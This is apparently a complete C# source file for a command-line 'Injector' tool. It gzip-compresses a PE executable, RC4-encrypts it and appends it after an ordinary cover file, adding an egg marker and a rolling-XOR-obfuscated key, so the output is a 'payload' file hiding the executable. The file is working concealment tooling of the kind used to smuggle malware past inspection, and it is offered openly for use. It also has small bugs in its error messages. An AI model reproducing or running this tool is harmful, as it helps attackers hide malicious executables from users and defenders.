using System;
using System.IO;
using System.Text;
using System.Linq;
using System.IO.Compression;
using System.Collections.Generic;

namespace Injector {
    class Program {
        public static byte[] Encrypt(byte[] pwd, byte[] data) {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++) {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++) {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++) {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }

        public static byte[] RollingXor(byte[] password, bool decrypt) {
            byte[] key = new byte[password.Length];
            if (decrypt) {
                Array.Reverse(password);
                key[key.Length - 1] = password[password.Length - 1];
                for (int i = password.Length - 2; i >= 0; i--)
                    key[i] = (byte)(password[i + 1] ^ password[i]);
                Array.Reverse(key);
            } else {
                key[0] = password[0];
                for (int i = 1; i < key.Length; i++)
                    key[i] = (byte)(key[i - 1] ^ password[i]);
            }
            return key;
        }

        public static void PrintBytes(byte[] bs) {
            for (int i = 0; i < bs.Length; i++) {
                Console.Write(String.Format((i == bs.Length - 1) ? "0x{0}" : "0x{0},", bs[i].ToString("X2")));
            }
        }
        static readonly string title = @"
 ______                                        __                         
/      |                                      /  |                        
$$$$$$/  _______      __   ______    _______ _$$ |_     ______    ______  
  $$ |  /       \    /  | /      \  /       / $$   |   /      \  /      \ 
  $$ |  $$$$$$$  |   $$/ /$$$$$$  |/$$$$$$$/$$$$$$/   /$$$$$$  |/$$$$$$  |
  $$ |  $$ |  $$ |   /  |$$    $$ |$$ |       $$ | __ $$ |  $$ |$$ |  $$/ 
 _$$ |_ $$ |  $$ |   $$ |$$$$$$$$/ $$ \_____  $$ |/  |$$ \__$$ |$$ |      
/ $$   |$$ |  $$ |   $$ |$$       |$$       | $$  $$/ $$    $$/ $$ |      
$$$$$$/ $$/   $$/_   $$ | $$$$$$$/  $$$$$$$/   $$$$/   $$$$$$/  $$/       
               /  \__$$ |                                                 
               $$    $$/                                                  
                $$$$$$/                                                   
";
        static readonly string banner = @"
                                         * * * * * * * * * * * * * * * * * * * * * *
                                        * ./injector <key> <egg> <file> <exe> <out> *
                                        *           note: use full paths           *
                                         * * * * * * * * * * * * * * * * * * * * *";

        static void Main(string[] args) {
            //Cannot run with PE larger than 4.199 GBs
            Console.WriteLine(title);

            if (args.Length != 5) {
                Console.WriteLine(banner);
                return;
            }
            if (args[0].Length < 2 || args[1].Length < 2) {
                Console.WriteLine("Key must be greater than 1 byte!");
                return;
            }
            if (!File.Exists(args[2])) {
                Console.WriteLine("{0} does not exist!", args[1]);
                return;
            }
            if (!File.Exists(args[3])) {
                Console.WriteLine("{0} does not exist!", args[2]);
                return;
            }
            if (File.Exists(args[4])) {
                Console.WriteLine("Overwriting {0}...", args[4]);
                File.Delete(args[4]);
            }

            string password = args[0];
            string egg = args[1];
            string injected_path = args[2];
            string pe_path = args[3];
            string payload_path = args[4];

            byte[] key = RollingXor(Encoding.UTF8.GetBytes(password), false);

            int egg_len = egg.Length;
            int key_len = key.Length;

            long in_file_len = new FileInfo(injected_path).Length;
            string in_file_name = new FileInfo(injected_path).Name;
            byte[] in_file_buf = new byte[in_file_len];

            long injected_file_len = new FileInfo(pe_path).Length;
            string injected_file_name = new FileInfo(pe_path).Name;
            byte[] injected_buf = new byte[injected_file_len];

            Console.WriteLine("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
            Console.WriteLine("Password:\t\t\t\t\t{0}", password);
            Console.WriteLine("Injected file:\t\t\t\t\t{0}", in_file_name);
            Console.WriteLine("PE file:\t\t\t\t\t{0}", injected_file_name);
            Console.WriteLine("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
            Console.WriteLine("Injected file total size (on disk):\t\t{0}", in_file_len);
            Console.WriteLine("PE file total size (on disk):\t\t\t{0}", injected_file_len);

            using (FileStream fs = new FileStream(injected_path, FileMode.Open)) {
                fs.Seek(0, SeekOrigin.Begin);
                fs.Read(in_file_buf, 0, (int)in_file_len);
                fs.Flush();
            }
            using (FileStream fs = new FileStream(pe_path, FileMode.Open)) {
                fs.Seek(0, SeekOrigin.Begin);
                fs.Read(injected_buf, 0, (int)injected_file_len);
                fs.Flush();
            }

            using (MemoryStream ms = new MemoryStream()) {
                using (GZipStream gz = new GZipStream(ms, CompressionMode.Compress)) {
                    new MemoryStream(injected_buf).CopyTo(gz);
                }
                byte[] encrypted_buf = Encrypt(Encoding.UTF8.GetBytes(password), ms.ToArray());

                Console.WriteLine("Encrypted PE file size compressed:\t\t{0}", encrypted_buf.Length);

                byte[] out_buf = new byte[in_file_len + egg_len + 2 + key_len + encrypted_buf.Length];

                for (int i = 0; i < in_file_len; i++)
                    out_buf[i] = in_file_buf[i];
                for (int i = 0; i < egg_len; i++)
                    out_buf[i + in_file_len] = (byte)egg[i];
                out_buf[in_file_len + egg_len + 1] = (byte)key.Length;
                for (int i = 0; i < key_len; i++)
                    out_buf[i + (in_file_len + egg_len + 2)] = key[i];
                for (int i = 0; i < encrypted_buf.Length; i++)
                    out_buf[i + (in_file_len + egg_len + 2 + key_len)] = encrypted_buf[i];

                Console.WriteLine("Payload to be written total size:\t\t{0}", out_buf.Length);

                using (FileStream fs = new FileStream(payload_path, FileMode.CreateNew)) {
                    fs.Write(out_buf, 0, out_buf.Length);
                    fs.Flush();
                }
            }

            Console.WriteLine("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
        }
    }
}
